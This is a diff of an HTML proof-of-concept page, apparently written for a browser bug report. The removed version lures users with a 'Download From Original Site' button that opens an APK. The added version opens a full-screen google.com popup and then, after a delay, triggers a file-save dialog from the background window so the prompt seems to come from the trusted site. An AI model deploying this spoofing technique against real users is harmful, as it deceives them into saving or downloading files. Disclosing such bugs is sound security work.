@@ -1,30 +1,71 @@
-<html>
- <head> 
+<!doctype html>
+<html lang="en">
+<head>
   <meta charset="utf-8">
-<style>
-.button {
-  background-color: #4CAF50;
-  border: none;
-  color: white;
-  padding: 15px 32px;
-  text-align: center;
-  text-decoration: none;
-  display: inline-block;
-  font-size: 16px;
-  margin: 4px 2px;
-  cursor: pointer;
-}
-</style>
- </head> 
- <body> 
-  <script>
-function a(){
-    window.open('http://frozzipies.github.io/test.apk', '_blank');
-    setTimeout(function(){
-        window.open('http://frozzipies.github.io/test.apk', '_blank', "popup=yes,width=900,height=700");
-    }, 1000);
-}
-</script> 
-  <center><input type="button" class="button" value="Download From Original Site" onclick="a()"> </center>
- </body>
+  <title>PoC</title>
+  <style>
+    body {
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      height:100vh;
+      font-family: sans-serif;
+    }
+    button {
+      padding: 14px 22px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+
+<button id="go">Go to Google</button>
+
+<script>
+  const TRUSTED_URL = "https://www.google.com";
+  const DELAY_MS = 5000;
+
+  function openTrustedPopup() {
+    const w = screen.availWidth;
+    const h = screen.availHeight;
+    window.open(
+      TRUSTED_URL,
+      "popup",
+      `width=${w},height=${h},left=0,top=0,resizable=yes,scrollbars=yes`
+    );
+  }
+
+  async function triggerFileSave() {
+    if (!('showSaveFilePicker' in window)) return;
+
+    try {
+      const handle = await window.showSaveFilePicker({
+        suggestedName: 'document.bin',
+        types: [{
+          description: 'Binary File',
+          accept: { 'application/octet-stream': ['.bin'] }
+        }]
+      });
+
+      const writable = await handle.createWritable();
+      await writable.write('This is only test content');
+      await writable.close();
+    } catch (e) {
+      // user canceled
+    }
+  }
+
+  document.getElementById("go").addEventListener("click", () => {
+    // 1) shift focus to trusted origin
+    openTrustedPopup();
+
+    // 2) delayed sensitive action from background window
+    setTimeout(() => {
+      triggerFileSave();
+    }, DELAY_MS);
+  });
+</script>
+
+</body>
 </html>
